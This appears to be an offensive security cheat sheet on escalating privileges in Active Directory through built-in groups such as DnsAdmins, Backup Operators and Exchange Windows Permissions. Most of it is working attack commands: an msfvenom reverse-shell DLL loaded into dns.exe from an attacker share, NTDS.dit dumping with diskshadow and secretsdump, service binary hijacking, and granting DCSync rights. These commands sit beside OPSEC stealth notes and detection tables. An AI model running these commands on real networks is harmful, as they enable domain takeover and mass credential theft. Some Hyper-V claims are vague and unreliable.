# Abusing Group Memberships for Privilege Escalation

## Overview

Several built-in AD groups grant powerful privileges that can be leveraged for privilege escalation. Many of these groups appear low-privilege (or administrative) but include rights that allow direct path to Domain Admin or full domain compromise.

## 1. DnsAdmins

### Overview
Members of the **DnsAdmins** group can manage DNS settings on Domain Controllers (which typically run the DNS Server service). They can load a malicious DLL into the DNS process (`dns.exe`), which runs as **SYSTEM**.

### Prerequisites
- Membership in `DnsAdmins` (or ability to be added to it)
- DNS Server role on a Domain Controller (default for DCs)
- Ability to restart the DNS service (or wait for server reboot)

### Enumeration
```powershell
# Find DnsAdmins group members
Get-DomainGroupMember -Identity "DnsAdmins"

# Check if DNS server is running on DC
Get-DomainComputer -Identity dc01 -Properties dnshostname | % { nslookup -type=ns $_.dnshostname 2>$null }

# AD Module
Get-ADGroupMember -Identity "DnsAdmins"

# NetExec
nxc ldap dc01 -u user -p pass --groups "DnsAdmins"
```

### Exploitation

#### Method 1: dnscmd (requires membership)

```cmd
# 1. Generate a malicious DLL (reverse shell, add user, etc.)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

# 2. Host the DLL on an SMB share accessible to the DC
# Or upload to the DC directly

# 3. Load the DLL via dnscmd
dnscmd DC01 /config /serverlevelplugindll \\10.10.10.10\share\evil.dll

# 4. Restart DNS service (requires privileges or wait for reboot)
sc \\dc01 stop dns
sc \\dc01 start dns

# 5. DLL executes as SYSTEM
```

#### Method 2: PowerShell DNS Administration

```powershell
# Using DNS Server PowerShell module (if available)
Import-Module DnsServer
$dnsserver = Get-DnsServer -ComputerName DC01
$dnsserver.ServerLevelPluginDll = "\\10.10.10.10\share\evil.dll"
Set-DnsServer -InputObject $dnsserver -ComputerName DC01

# Restart DNS
Restart-Service -Name DNS -ComputerName DC01 -Force
```

#### Method 3: No Restart Required

```cmd
# If DNS can't be restarted, you may still be able to get code execution:
# 1. Set the DLL path
# 2. Wait for DNS service restart (reboot cycle)
# OR find another way to trigger dns.exe to load your DLL
```

### OPSEC
- **dnscmd** execution creates Event ID 770 (DNS Server plugin modification)
- **Service restart** on DNS generates Event ID 7036 (service state change)
- Malicious DLL load generates Event ID 4688 (process creation within dns.exe)
- DNS being a critical service — stopping it causes domain resolution outages
- **Note**: Rebooting DNS or DC is noisy and disruptive

### Detection
| Event ID | Description |
|----------|-------------|
| 770 | DNS Server plugin DLL changed |
| 7036 | DNS service state change |
| 7031 | DNS service terminated unexpectedly |
| 4688 | Process creation (dns.exe loads DLL) |

---

## 2. Backup Operators

### Overview
Members of **Backup Operators** can back up and restore files on any domain-joined system regardless of file permissions via SeBackupPrivilege and SeRestorePrivilege.

### Prerequisites
- Membership in `Backup Operators`

### Enumeration
```powershell
# Find Backup Operators
Get-DomainGroupMember -Identity "Backup Operators"

# AD Module
Get-ADGroupMember -Identity "Backup Operators"
```

### Exploitation

#### Method 1: Backup NTDS.dit from Domain Controller

```cmd
# On the Domain Controller as Backup Operator:

# 1. Use diskshadow to create a volume shadow copy
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias tempvol
DISKSHADOW> create
DISKSHADOW> expose %tempvol% Z:
DISKSHADOW> end backup
DISKSHADOW> exit

# 2. Copy NTDS.dit and SYSTEM hive from shadow copy
copy Z:\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
copy Z:\Windows\System32\config\SYSTEM C:\Windows\Temp\system.bak

# 3. Remove shadow copy
diskshadow.exe
DISKSHADOW> delete shadows volume C:
DISKSHADOW> reset

# 4. Extract hashes locally
python3 secretsdump.py -ntds ntds.dit -system system.bak LOCAL
```

#### Method 2: Robocopy with /B flag

```cmd
# Robocopy with /B (Backup) flag bypasses file permissions
robocopy /B C:\Windows\NTDS C:\Windows\Temp\ntds_dump
# Then copy
copy C:\Windows\Temp\ntds_dump\NTDS.dit ntds.dit
```

#### Method 3: Using diskshadow + robocopy script

```cmd
# BackupOperators.bat
diskshadow /s C:\path\to\shadow.txt
robocopy /B Z:\Windows\NTDS C:\path\to\output NTDS.dit
```

#### Method 4: Impacket secretsdump (if Backup Operator remotely)

```bash
# With Backup Operator privileges on DC, secretsdump may work
python3 secretsdump.py -just-dc domain/backup_operator:pass@DC01.domain.local

# If not, dump NTDS through volume shadow copy and exfiltrate
```

### OPSEC
- Volume Shadow Copy service events: Event ID 7036
- diskshadow execution: Event ID 4688, 7036
- Event ID 5248 (Backup Operator membership usage) in some environments
- File copy of NTDS.dit: Event ID 4663 (file read)
- **Note**: Modern EDR may detect NTDS.dit being accessed by a non-LSASS process

### Detection
| Event ID | Description |
|----------|-------------|
| 5248 | A backup was performed by Backup Operator |
| 4688 | diskshadow.exe, robocopy.exe execution |
| 7036 | Volume Shadow Copy service state change |
| 4663 | File read access to NTDS.dit |

---

## 3. Print Operators

### Overview
Members of **Print Operators** can manage printers and print drivers on Domain Controllers. They can load a malicious DLL as a print driver that executes as SYSTEM in the spoolsv.exe process.

### Prerequisites
- Membership in `Print Operators`

### Exploitation

```cmd
# 1. Add a printer driver (malicious DLL)
# Using printui.dll or custom tool

# 2. The malicious print driver (DLL) runs as SYSTEM in spoolsv.exe

# Manual exploitation example:
rundll32 printui.dll,PrintUIEntry /ia /m "Generic" /h "X64" /v "3" /f "C:\path\to\malicious.dll"

# Or using custom tools to add driver and trigger
# The attacker must have write access to add drivers
```

### OPSEC
- Printer driver installation: Event ID 316 (spoolsv print driver)
- DLL load in spoolsv.exe: Event ID 4688
- spoolsv.exe runs as SYSTEM

### Detection
| Event ID | Description |
|----------|-------------|
| 316 | Print driver added or updated |
| 4688 | Process creation (spoolsv loading driver) |
| 7036 | Print Spooler service events |

---

## 4. Server Operators

### Overview
Members of **Server Operators** can shut down/restart servers, manage services, and perform certain backup operations. They have local admin equivalent on Domain Controllers for managing services.

### Prerequisites
- Membership in `Server Operators`

### Exploitation

```cmd
# Server Operators can start/stop any service on a DC
# Abuse: Change an existing service binary path to execute malicious code

# 1. Check service permissions
sc \\dc01 qc SomeService

# 2. Change service binary path
sc \\dc01 config SomeService binPath= "cmd /c net localgroup Administrators user /add"

# 3. Start the service
sc \\dc01 start SomeService

# Or shutdown/restart DC
shutdown /r /t 0 /m \\dc01
```

### OPSEC
- Service modification: Event ID 7045
- System shutdown/restart: Event ID 1074 (system shutdown)

### Detection
| Event ID | Description |
|----------|-------------|
| 7045 | Service configuration change |
| 7036 | Service state change |
| 1074 | System shutdown/restart |

---

## 5. Hyper-V Administrators

### Overview
Members of **Hyper-V Administrators** have full control over Hyper-V VMs. The Hyper-V management tools (`vmconnect.exe`) run with SYSTEM privileges and can be abused to execute code on the host.

### Prerequisites
- Membership in `Hyper-V Administrators`
- Hyper-V role installed on the machine

### Exploitation

```cmd
# Method 1: Mount a VM disk and replace files
# Access a VM's virtual disk (.vhdx/.vhd)
# Replace executables in the VM with malicious ones

# Method 2: Use vmconnect to execute code on Hyper-V host
# Create a new VM with malicious kernel/execution

# Method 3: if Hyper-V Manager snap-in can be exploited
# Using the Hyper-V WMI provider to create/modify VMs

# Practical attack example:
# 1. Create a new VM ISO that boots and dumps host memory
# 2. Modify an existing VM's configuration to execute on host
```

### OPSEC
- VM creation/modification: Event ID 2000+ (Hyper-V logs)
- VMConnect.exe runs as SYSTEM — any exploit via it executes at that level

### Detection
| Event ID | Description |
|----------|-------------|
| 2000-2200 | Hyper-V operational logs |

---

## 6. Account Operators

### Overview
Members of **Account Operators** can create and modify most user accounts and group memberships in the domain. They can add users to most groups **except** Domain Admins, Enterprise Admins, and some built-in privileged groups.

### Prerequisites
- Membership in `Account Operators`

### Exploitation

```powershell
# Account Operators CAN:
# 1. Reset passwords of non-protected users
Set-DomainUserPassword -Identity non_protected_user -AccountPassword (ConvertTo-SecureString "P@ss123" -AsPlainText -Force)

# 2. Add users to groups EXCEPT Domain Admins/Enterprise Admins
Add-DomainGroupMember -Identity "Backup Operators" -Members 'attacker'   # Works
Add-DomainGroupMember -Identity "Server Operators" -Members 'attacker'   # Works
Add-DomainGroupMember -Identity "DnsAdmins" -Members 'attacker'          # Works

# 3. Add users to "Administrators" group on non-DC machines
Add-DomainGroupMember -Identity "Administrators" -Members 'attacker'

# Chain attack:
# 1. Add self to DnsAdmins
# 2. Exploit DnsAdmins → SYSTEM on DC

# 2. Add self to Backup Operators
# 3. Exploit Backup Operators → NTDS.dit
```

### OPSEC
- Group membership changes: Event ID 4728/4732/4756 (adding to groups)
- Password reset: Event ID 4724
- Account Operators actions are heavily logged

### Detection
| Event ID | Description |
|----------|-------------|
| 4724 | Password reset |
| 4728/4732/4756 | Group membership changes |

---

## 7. Exchange Windows Permissions

### Overview
The **Exchange Windows Permissions** group (and the `Organization Management` group) has `WriteDACL` access to the domain by default in Exchange environments. This is because Exchange requires rights to modify user attributes (mailbox settings).

### Prerequisites
- Membership in `Exchange Windows Permissions` or `Organization Management`
- Exchange installed in the environment

### Exploitation

```powershell
# Exchange Windows Permissions group has WriteDACL on domain
# This means members can grant themselves DCSync rights

# Step 1: Add DCSync rights for current user
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync

# Step 2: DCSync
python3 secretsdump.py domain/user:pass@DC01 -just-dc

# OR: Use the "Exchange Trusted Subsystem" group
# This group has membership in Exchange Windows Permissions
# If you compromise an Exchange server, you can leverage this

# PowerView approach
$exchGroup = Get-DomainGroup "Exchange Windows Permissions"
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync

# Alternative: WriteDACL on domain → modify ACL directly
```

### OPSEC
- ACL modification: Event ID 5136 (WriteDACL modification)
- DCSync: Event ID 4662
- Exchange group membership is expected to make domain modifications, so this path is stealthier

### Detection
| Event ID | Description |
|----------|-------------|
| 5136 | ACL modification (WriteDACL) |
| 4662 | DCSync replication |
| 4728 | Group membership changes |

---

## General Enumeration — Find Your Group Memberships

```powershell
# Check your current user's group memberships
whoami /groups

# PowerView - current user
Get-DomainUser -Identity whoami -Properties memberOf

# AD Module
Get-ADUser -Identity user -Properties memberOf

# List all members of a specific group
Get-DomainGroupMember -Identity "DnsAdmins"
Get-DomainGroupMember -Identity "Backup Operators"
Get-DomainGroupMember -Identity "Print Operators"
Get-DomainGroupMember -Identity "Server Operators"
Get-DomainGroupMember -Identity "Account Operators"
Get-DomainGroupMember -Identity "Hyper-V Administrators"
Get-DomainGroupMember -Identity "Exchange Windows Permissions"

# BloodHound
MATCH (u:User {name:"USER@DOMAIN.LOCAL"})-[:MemberOf]->(g:Group) RETURN g.name

# NetExec
nxc ldap dc01 -u user -p pass --groups "Backup Operators"
```

## OPSEC Summary

| Group | Attack | Noise Level | Detection |
|-------|--------|-------------|-----------|
| DnsAdmins | DLL load via dnscmd | Medium (DNS restart) | Event 770 |
| Backup Operators | Volume shadow copy + NTDS dump | High (diskshadow events) | Event 5248 |
| Print Operators | Malicious print driver | Medium | Event 316 |
| Server Operators | Service modification | High | Event 7045 |
| Hyper-V Admins | VM file access / host execution | Medium | Hyper-V logs |
| Account Operators | Escalate via sub-group | Medium | Group modification events |
| Exchange Windows Permissions | WriteDACL → DCSync | Low (expected behavior) | Event 5136 |

## Quick Reference

```powershell
# Check groups
whoami /groups
Get-DomainGroupMember -Identity "DnsAdmins"

# DnsAdmins DLL load
dnscmd DC01 /config /serverlevelplugindll \\share\evil.dll
sc stop dns; sc start dns

# Backup Operators NTDS dump
diskshadow /s script.txt  # Create VSS
robocopy /B Z:\Windows\NTDS C:\dump NTDS.dit
python3 secretsdump.py -ntds NTDS.dit -system system.hive LOCAL

# Backup Operators - just-dc
python3 secretsdump.py -just-dc domain/user:pass@DC01

# Account Operators → DnsAdmins
net group "DnsAdmins" user /add /domain

# Exchange Windows Permissions → DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync
python3 secretsdump.py domain/user:pass@DC01 -just-dc

# BloodHound - group membership
MATCH (u:User)-[:MemberOf]->(g:Group) WHERE u.name = "USER@DOMAIN.LOCAL" RETURN g.name
```
